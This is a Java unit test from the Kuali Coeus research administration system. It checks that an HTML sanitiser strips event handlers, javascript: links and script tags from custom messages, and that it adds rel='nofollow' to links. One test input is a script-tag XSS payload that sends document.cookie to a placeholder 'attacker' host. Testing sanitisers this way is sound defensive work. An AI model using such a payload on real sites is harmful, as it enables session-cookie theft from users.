/*
 * Kuali Coeus, a comprehensive research administration system for higher education.
 *
 * Copyright 2005-2016 Kuali, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.kuali.coeus.propdev.impl.s2s.nih;

import org.junit.Assert;
import org.junit.Test;

public class NihValidationMappingTest {

    @Test
    public void testHtmlValidation() {
        NihValidationMapping mapping = new NihValidationMapping();

        String description = "blah blah blah blah " +
                "Buuuhahahahahaha <a href=\"http://www.google.com\">tototototo</a>" +
                "blah blah blah blah blah ";
        mapping.setCustomMessage(description);
        mapping.cleanCustomMessage();
        String clean = mapping.getCustomMessage();
        Assert.assertEquals(clean, "blah blah blah blah Buuuhahahahahaha \n" +
                "<a href=\"http://www.google.com\" rel=\"nofollow\">tototototo</a>blah blah blah blah blah");

        description = "blah blah blah blah " +
                "Buuuhahahahahaha <a href=\"http://www.google.com\">tototototo</a>" +
                "blah blah blah blah blah <a href=\"http://www.google.com\">tototototo" +
                "</a> blah blah blah blah ";
        mapping.setCustomMessage(description);
        mapping.cleanCustomMessage();
        clean = mapping.getCustomMessage();
        Assert.assertEquals(clean, "blah blah blah blah Buuuhahahahahaha \n" +
                "<a href=\"http://www.google.com\" rel=\"nofollow\">tototototo</a>blah blah blah blah blah \n" +
                "<a href=\"http://www.google.com\" rel=\"nofollow\">tototototo</a> blah blah blah blah");

        description = "blah blah blah blah blah blah " +
                "<a href=\"https://www.w3schools.com\" target=\"_blank\">Visit W3Schools</a> blah blah blah ";
        mapping.setCustomMessage(description);
        mapping.cleanCustomMessage();
        clean = mapping.getCustomMessage();
        Assert.assertEquals(clean, "blah blah blah blah blah blah \n" +
                "<a href=\"https://www.w3schools.com\" target=\"_blank\" rel=\"nofollow\">Visit W3Schools</a> blah blah blah");

        description = "<h1 onclick=\"this.innerHTML = 'Ooops!'\">Click on this text!</h1>\n";
        mapping.setCustomMessage(description);
        mapping.cleanCustomMessage();
        clean = mapping.getCustomMessage();
        Assert.assertEquals(clean, "Click on this text!");

        description = "blah blah blah blah  <script>\n" +
                "window.location='http://attacker/?cookie='+document.cookie\n" +
                "</script> blah blah blah blah ";
        mapping.setCustomMessage(description);
        mapping.cleanCustomMessage();
        clean = mapping.getCustomMessage();
        Assert.assertEquals(clean, "blah blah blah blah  blah blah blah blah");

        description = "blah blah blah blah  <a href=\"javascript:;\"></a> blah blah blah blah ";
        mapping.setCustomMessage(description);
        mapping.cleanCustomMessage();
        clean = mapping.getCustomMessage();
        Assert.assertEquals(clean, "blah blah blah blah \n" +
                "<a rel=\"nofollow\"></a> blah blah blah blah");

        description = "blah blah blah blah " +
                "Buuuhahahahahaha <a href=\"http://www.google.com\">tototototo</a>" +
                "blah blah blah blah blah <a href=\"javascript:;\"></a>";
        mapping.setCustomMessage(description);
        mapping.cleanCustomMessage();
        clean = mapping.getCustomMessage();
        Assert.assertEquals(clean, "blah blah blah blah Buuuhahahahahaha \n" +
                "<a href=\"http://www.google.com\" rel=\"nofollow\">tototototo</a>blah blah blah blah blah \n" +
                "<a rel=\"nofollow\"></a>");

        description = "<h1 onclick=\"this.innerHTML = 'Ooops!'\">Click on this text!</h1> " +
                "\n <a href=\"http://www.google.com\">tototototo";
        mapping.setCustomMessage(description);
        mapping.cleanCustomMessage();
        clean = mapping.getCustomMessage();
        Assert.assertEquals(clean, "Click on this text! \n" +
                "<a href=\"http://www.google.com\" rel=\"nofollow\">tototototo</a>");

        description = "<a href=\"www.mysite.com\" onClick=\"javascript.function();\">Item</a>";
        mapping.setCustomMessage(description);
        mapping.cleanCustomMessage();
        clean = mapping.getCustomMessage();
        Assert.assertEquals(clean, "<a rel=\"nofollow\">Item</a>");

        description = "<a href=\"www.mysite.com\" onClick=\"callFunction();\">Item</a>";
        mapping.setCustomMessage(description);
        mapping.cleanCustomMessage();
        clean = mapping.getCustomMessage();
        Assert.assertEquals(clean, "<a rel=\"nofollow\">Item</a>");

    }
}
